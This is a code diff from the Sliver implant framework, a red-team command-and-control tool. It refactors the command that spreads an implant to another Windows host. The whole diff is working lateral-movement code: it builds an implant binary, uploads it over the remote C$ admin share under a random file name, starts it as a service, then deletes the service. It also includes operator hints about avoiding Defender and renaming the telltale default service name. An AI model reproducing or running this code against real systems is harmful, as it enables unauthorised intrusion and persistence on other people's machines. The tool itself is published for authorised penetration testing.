@@ -1,61 +1,85 @@
-package command
+package commands
+
+/*
+	Sliver Implant Framework
+	Copyright (C) 2019  Bishop Fox
+
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+
+	You should have received a copy of the GNU General Public License
+	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
 
 import (
 	"context"
 	"fmt"
 	"math/rand"
-	"path/filepath"
 	"strings"
 	"time"
 
+	cctx "github.com/bishopfox/sliver/client/context"
 	"github.com/bishopfox/sliver/client/spin"
+	"github.com/bishopfox/sliver/client/transport"
+	"github.com/bishopfox/sliver/client/util"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/rpcpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/util/encoders"
-	"github.com/desertbit/grumble"
 )
 
-func psExec(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
-	session := ActiveSession.Get()
+// Service - Start a sliver service on a remote target
+type Service struct {
+	Positional struct {
+		Target string `description:"target FQDN" required:"1-1"`
+	} `positional-args:"yes" required:"yes"`
+
+	Options struct {
+		ServiceName string `long:"service-name" short:"s" description:"name to be used to register the service" default:"Sliver"`
+		Description string `long:"service-description" short:"d" description:"description of the service" default:"Sliver implant"`
+		Profile     string `long:"profile" short:"p" description:"implant profile to use for service binary" required:"yes"`
+		RemotePath  string `long:"binpath" short:"b" description:"directory to which the executable will be uploaded" default:"c:\\windows\\temp"`
+		Timeout     int    `long:"timeout" short:"t" description:"command timeout in seconds" default:"60"`
+	} `group:"service options"`
+}
+
+// Execute - Start a sliver service on a remote target
+func (s *Service) Execute(args []string) (err error) {
+	session := cctx.Context.Sliver.Session
 	if session == nil {
-		fmt.Printf(Warn + "Please select an active session via `use`")
 		return
 	}
 
-	if len(ctx.Args) < 1 {
-		fmt.Println(Warn + "you need to provide a target host, see `help psexec` for examples")
-		return
-	}
+	hostname := s.Positional.Target
 
-	hostname := ctx.Args[0]
-
-	profile := ctx.Flags.String("profile")
-	serviceName := ctx.Flags.String("service-name")
-	serviceDesc := ctx.Flags.String("service-description")
-	binPath := ctx.Flags.String("binpath")
-	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(ctx.Flags.String("binpath")), "c:", "C$"))
+	profile := s.Options.Profile
+	serviceName := s.Options.ServiceName
+	serviceDesc := s.Options.Description
+	binPath := s.Options.RemotePath
+	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))
 
 	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
-		fmt.Printf(Warn+"Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
-		fmt.Println(Warn + "You might want to change that before going further...")
+		fmt.Printf(util.Error+"Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
+		fmt.Println(util.Error + "You might want to change that before going further...")
 		if !isUserAnAdult() {
 			return
 		}
 	}
 
-	if profile == "" {
-		fmt.Println(Warn + "you need to pass a profile name, see `help psexec` for more info")
-		return
-	}
-
 	// generate sliver
 	generateCtrl := make(chan bool)
 	go spin.Until(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
-	profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
+	profiles, err := transport.RPC.ImplantProfiles(context.Background(), &commonpb.Empty{})
 	if err != nil {
-		fmt.Printf(Warn+"Error: %v\n", err)
+		fmt.Printf(util.Error+"Error: %v\n", err)
 		return
 	}
 	generateCtrl <- true
@@ -67,30 +91,30 @@ func psExec(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		}
 	}
 	if p.GetName() == "" {
-		fmt.Printf(Warn+"no profile found for name %s\n", profile)
+		fmt.Printf(util.Error+"no profile found for name %s\n", profile)
 		return
 	}
-	sliverBinary, err := getSliverBinary(*p, rpc)
+	sliverBinary, err := getSliverBinary(*p, transport.RPC)
 	filename := randomString(10)
 	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
 	uploadGzip := new(encoders.Gzip).Encode(sliverBinary)
 	// upload to remote target
 	uploadCtrl := make(chan bool)
 	go spin.Until("Uploading service binary ...", uploadCtrl)
-	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
+	upload, err := transport.RPC.Upload(context.Background(), &sliverpb.UploadReq{
 		Encoder: "gzip",
 		Data:    uploadGzip,
 		Path:    filePath,
-		Request: ActiveSession.Request(ctx),
+		Request: ContextRequest(session),
 	})
 	uploadCtrl <- true
 	<-uploadCtrl
 	if err != nil {
-		fmt.Printf(Warn+"Error: %s\n", err)
+		fmt.Printf(util.Error+"Error: %s\n", err)
 		return
 	}
-	fmt.Printf(Info+"Uploaded service binary to %s\n", upload.GetPath())
-	fmt.Println(Info + "Waiting a bit for the file to be analyzed ...")
+	fmt.Printf(util.Info+"Uploaded service binary to %s\n", upload.GetPath())
+	fmt.Println(util.Info + "Waiting a bit for the file to be analyzed ...")
 	// Looks like starting the service right away often fails
 	// because a process is already using the binary.
 	// I suspect that Defender on my lab is holding access
@@ -101,45 +125,46 @@ func psExec(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 	binaryPath := fmt.Sprintf(`%s\%s.exe`, binPath, filename)
 	serviceCtrl := make(chan bool)
 	go spin.Until("Starting service ...", serviceCtrl)
-	start, err := rpc.StartService(context.Background(), &sliverpb.StartServiceReq{
+	start, err := transport.RPC.StartService(context.Background(), &sliverpb.StartServiceReq{
 		BinPath:            binaryPath,
 		Hostname:           hostname,
-		Request:            ActiveSession.Request(ctx),
 		ServiceDescription: serviceDesc,
 		ServiceName:        serviceName,
 		Arguments:          "",
+		Request:            ContextRequest(session),
 	})
 	serviceCtrl <- true
 	<-serviceCtrl
 	if err != nil {
-		fmt.Printf(Warn+"Error: %v\n", err)
+		fmt.Printf(util.Error+"Error: %v\n", err)
 		return
 	}
 	if start.Response != nil && start.Response.Err != "" {
-		fmt.Printf(Warn+"Error: %s", start.Response.Err)
+		fmt.Printf(util.Error+"Error: %s\n", start.Response.Err)
 		return
 	}
-	fmt.Printf(Info+"Successfully started service on %s (%s)\n", hostname, binaryPath)
+	fmt.Printf(util.Info+"Successfully started service on %s (%s)\n", hostname, binaryPath)
 	removeChan := make(chan bool)
 	go spin.Until("Removing service ...", removeChan)
-	removed, err := rpc.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
+	removed, err := transport.RPC.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
 		ServiceInfo: &sliverpb.ServiceInfoReq{
 			Hostname:    hostname,
 			ServiceName: serviceName,
 		},
-		Request: ActiveSession.Request(ctx),
+		Request: ContextRequest(session),
 	})
 	removeChan <- true
 	<-removeChan
 	if err != nil {
-		fmt.Printf(Warn+"Error: %v", err)
+		fmt.Printf(util.Error+"Error: %v\n", err)
 		return
 	}
 	if removed.Response != nil && removed.Response.Err != "" {
-		fmt.Printf(Warn+"Error: %s\n", removed.Response.Err)
+		fmt.Printf(util.Error+"Error: %s\n", removed.Response.Err)
 		return
 	}
-	fmt.Printf(Info+"Successfully removed service %s on %s\n", serviceName, hostname)
+	fmt.Printf(util.Info+"Successfully removed service %s on %s\n", serviceName, hostname)
+	return nil
 }
 
 func randomString(length int) string {
@@ -163,7 +188,7 @@ func getSliverBinary(profile clientpb.ImplantProfile, rpc rpcpb.SliverRPCClient)
 	_, ok := builds.GetConfigs()[implantName]
 	if implantName == "" || !ok {
 		// no built implant found for profile, generate a new one
-		fmt.Printf(Info+"No builds found for profile %s, generating a new one\n", profile.GetName())
+		fmt.Printf(util.Info+"No builds found for profile %s, generating a new one\n", profile.GetName())
 		ctrl := make(chan bool)
 		go spin.Until("Compiling, please wait ...", ctrl)
 		generated, err := rpc.Generate(context.Background(), &clientpb.GenerateReq{
@@ -184,7 +209,7 @@ func getSliverBinary(profile clientpb.ImplantProfile, rpc rpcpb.SliverRPCClient)
 		}
 	} else {
 		// Found a build, reuse that one
-		fmt.Printf(Info+"Sliver name for profile: %s\n", implantName)
+		fmt.Printf(util.Info+"Sliver name for profile: %s\n", implantName)
 		regenerate, err := rpc.Regenerate(context.Background(), &clientpb.RegenerateReq{
 			ImplantName: profile.GetConfig().GetName(),
 		})
@@ -195,7 +220,4 @@ func getSliverBinary(profile clientpb.ImplantProfile, rpc rpcpb.SliverRPCClient)
 		data = regenerate.GetFile().GetData()
 	}
 	return data, err
-}
-func buildImplantName(name string) string {
-	return strings.TrimSuffix(name, filepath.Ext(name))
 }
